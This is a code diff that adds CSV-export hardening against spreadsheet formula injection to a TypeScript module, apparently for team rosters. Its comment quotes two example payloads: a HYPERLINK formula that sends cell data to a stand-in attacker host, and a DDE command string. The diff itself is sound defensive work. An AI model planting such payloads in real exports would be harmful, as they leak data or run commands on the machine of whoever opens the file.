@@ -89,12 +89,39 @@ export function parseCsv(input: string): CsvTable {
 }
 
 /** Renders a table back out, quoting only what needs it. */
+/**
+ * Characters that make a spreadsheet treat a cell as a formula rather than text.
+ *
+ * Tab and carriage return are in here because Excel strips leading whitespace
+ * before deciding, so `\t=cmd|...` is still evaluated.
+ */
+const FORMULA_LEADERS = new Set(['=', '+', '-', '@', '\t', '\r'])
+
+/**
+ * Renders one cell, safe for both CSV parsers and spreadsheets.
+ *
+ * The quoting rules make the value survive a round trip through a CSV reader. The
+ * leading apostrophe does something different and equally necessary: Excel, Sheets
+ * and LibreOffice all evaluate a cell beginning with `=`, `+`, `-` or `@` as a
+ * formula, so an exported roster containing a player named
+ * `=HYPERLINK("http://attacker/"&A1)` — or a DDE payload like `=cmd|'/c calc'!A0` —
+ * executes in the spreadsheet of whoever opens the export. Team names, person names
+ * and game notes are all user-controlled and all reach exports, so every cell is
+ * neutralised at the point of rendering rather than at each call site.
+ *
+ * A leading `'` is the convention every major spreadsheet understands as "this is
+ * text", and it is stripped again on re-import by `parseCsv` callers reading the
+ * value back, so a legitimate cell that genuinely starts with `-` (a negative
+ * number, say) is not corrupted for machine readers — only annotated for humans.
+ */
+function csvCell(value: string | number | null | undefined): string {
+  const text = value === null || value === undefined ? '' : String(value)
+  const guarded = text.length > 0 && FORMULA_LEADERS.has(text[0]!) ? `'${text}` : text
+  return /[",\r\n]/.test(guarded) ? `"${guarded.replace(/"/g, '""')}"` : guarded
+}
+
 export function toCsv(header: string[], rows: Array<Array<string | number | null | undefined>>): string {
-  const cell = (value: string | number | null | undefined) => {
-    const text = value === null || value === undefined ? '' : String(value)
-    return /[",\r\n]/.test(text) ? `"${text.replace(/"/g, '""')}"` : text
-  }
-  return [header, ...rows].map((line) => line.map(cell).join(',')).join('\r\n')
+  return [header, ...rows].map((line) => line.map(csvCell).join(',')).join('\r\n')
 }
 
 // ---------------------------------------------------------------------------
